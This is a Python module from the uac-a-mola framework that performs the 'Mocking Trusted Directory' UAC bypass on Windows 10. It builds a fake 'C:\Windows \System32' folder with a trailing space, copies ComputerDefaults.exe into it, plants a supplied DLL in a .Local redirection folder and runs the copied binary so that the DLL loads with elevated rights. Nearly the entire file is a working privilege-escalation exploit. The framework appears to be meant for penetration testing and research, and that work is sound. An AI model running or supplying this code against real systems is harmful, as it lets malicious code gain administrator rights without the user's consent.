# This file is part of uac-a-mola
# Author(C) Josue Encinar
#
# DESCRIPTION
# Mockingtrusteddirectory UAC bypass 
from module import Module
import subprocess
import copy
import os
import shutil
from platform import platform


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Mockingtrusteddirectory",
                       "Description": "UAC bypass through Mocking Trusted Directory method (windows10)",
                       "Author": "Josue Encinar"}

        # -----------name-----default_value--description
        options = {"base": [None, "DLL path", True],
                   "dll": ["comctl32.dll", "Dll name", True],
                   "common-control": ["amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17763.615_none_05b4414a072024d4", "DLL folder name", True]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if "Windows-10" in platform():
            self.__bypass()
        else:
            print("This Bypass works in Winows 10")

    def __bypass(self):
        new_windows_path = "\\\\?\\C:\\Windows \\"
        new_system32_path = "C:\\Windows \\System32"
        computerdefaults_path = "C:\\Windows \\System32\\ComputerDefaults.exe.Local"
        computerdefaults_path_2 = "C:\\Windows \\System32\\ComputerDefaults.exe.Local\\{}".format(self.args["common-control"])
        if not os.path.isdir(new_windows_path):
            os.mkdir(new_windows_path)
        if not os.path.isdir(new_system32_path):
            os.mkdir(new_system32_path)
        
        shutil.copy(src = "C:\\Windows\\System32\\ComputerDefaults.exe", dst="C:\\Windows \\System32\\ComputerDefaults.exe")
        if not os.path.isdir(computerdefaults_path):
            os.mkdir(computerdefaults_path)
        if not os.path.isdir(computerdefaults_path_2):
            os.mkdir(computerdefaults_path_2)
        shutil.copy(src="{0}\\{1}".format(self.args["base"], self.args["dll"]), 
                    dst="C:\\Windows \\System32\\ComputerDefaults.exe.Local\\{0}\\{1}".format(self.args["common-control"], self.args["dll"]))
        try:
            subprocess.call("C:\\Windows \\System32\\ComputerDefaults.exe", shell=True)
        except Exception as e:
            print("Failed!")
            print(e)